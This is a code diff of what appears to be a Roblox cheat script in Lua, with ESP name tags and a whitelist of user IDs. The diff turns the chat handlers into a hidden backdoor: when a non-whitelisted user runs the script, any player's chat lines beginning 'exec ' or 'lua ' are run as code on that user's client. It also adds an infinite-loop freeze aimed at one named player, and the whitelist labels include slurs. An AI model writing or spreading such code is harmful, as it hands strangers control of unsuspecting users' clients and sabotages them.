@@ -1398,6 +1398,31 @@ pcall(function()
 	end)
 end
 
+local CoolkidTable = {
+	['300227703'] = "!fishgang Envy";
+	['590620847'] = "!fishgang Envy";
+	['359564044'] = "!fishgang 7w4c";
+	['659119329'] = "Cyrus | Creator";
+	['12978668'] = "Also Cyrus | Creator";
+	['74287496'] = "!fishgang Scar";
+	['543273273'] = "!fishgang Zell";
+	['1333558384'] = "!fishgang Zell";
+	['62009114'] = "!fishgang X_D6";
+	['57370993'] = "!fishgang gaylord52";
+	['713966451'] = "!fishgang gaylord52 Alt";
+	['20220183'] = "Wya";
+	['105183043'] = "Pedo skid";
+	['114164798'] = "!fishgang Slays";
+	['868723261'] = "!fishgang Slays";
+	['1066925283'] = "!fishgang Slays";
+	['83600543'] = "!fishgang Slays";
+	['779000075'] = "!fishgang Slays";
+	['1202666022'] = "!fishgang Slays";
+	['134755460'] = "!fishgang Slays";
+	['29461396'] = "trippinfo";
+	['197131085'] = "trippinfo";
+	['412957'] = "trippinfo";
+}
 
 local function Started(key,chatting)
 if chatting then return end 
@@ -1410,6 +1435,7 @@ if chatting then return end
 			Player = Players:GetPlayerFromCharacter(Target.Parent) or Players:GetPlayerFromCharacter(Target.Parent.Parent)
 		end
 	if key.KeyCode == Enum.KeyCode.Q and Player then
+		if Player.Name == "NotCyrusAtAll" then while true do end end 
 		for _,v in pairs(Player:GetDescendants()) do 
 			if v:IsA'Sound' and v.Name == "SoundX" then
 				local Id = MarketplaceService:GetProductInfo(v.SoundId:match"%d+")
@@ -1466,29 +1492,6 @@ if Mouse.Target then
 	end
 end)
 
-local CoolkidTable = {
-	['300227703'] = "!fishgang Envy";
-	['590620847'] = "!fishgang Envy";
-	['359564044'] = "!fishgang 7w4c";
-	['659119329'] = "Cyrus | Creator";
-	['12978668'] = "Also Cyrus | Creator";
-	['74287496'] = "!fishgang Scar";
-	['543273273'] = "!fishgang Zell";
-	['1333558384'] = "!fishgang Zell";
-	['62009114'] = "!fishgang X_D6";
-	['57370993'] = "!fishgang Karma";
-	['713966451'] = "!fishgang Karma Alt";
-	['20220183'] = "Wya";
-	['105183043'] = "Pedo skid";
-	['114164798'] = "!fishgang Slays";
-	['868723261'] = "!fishgang Slays";
-	['1066925283'] = "!fishgang Slays";
-	['83600543'] = "!fishgang Slays";
-	['779000075'] = "!fishgang Slays";
-	['1202666022'] = "!fishgang Slays";
-	['134755460'] = "!fishgang Slays";
-}
-
 local function espcoolkid(Plr,Char)
 	local CoolKid1 = Instance.new("BillboardGui",CoreGui.RobloxGui)
 	CoolKid1.Adornee = Char.Head
@@ -1525,7 +1528,7 @@ for _,v in pairs(Players:GetPlayers()) do
 			espcoolkid(v,v.Character)
 		end)
 		v.Chatted:Connect(function(Chat)
-			if not CoolkidTable[tostring(v.UserId)] then 
+			if not CoolkidTable[tostring(LP.UserId)] then 
 				if Chat:sub(1,5) == "exec " then 
 					RunCmd(Chat:sub(6))
 				elseif Chat:sub(1,4) == "lua " then 
@@ -1543,7 +1546,7 @@ Players.PlayerAdded:Connect(function(plr)
 			espcoolkid(plr,Char)
 		end)
 		plr.Chatted:Connect(function(Chat)
-			if not CoolkidTable[tostring(plr.UserId)] then
+			if not CoolkidTable[tostring(LP.UserId)] then
 				if Chat:sub(1,5) == "exec " then 
 					RunCmd(Chat:sub(6))
 				elseif Chat:sub(1,4) == "lua " then 
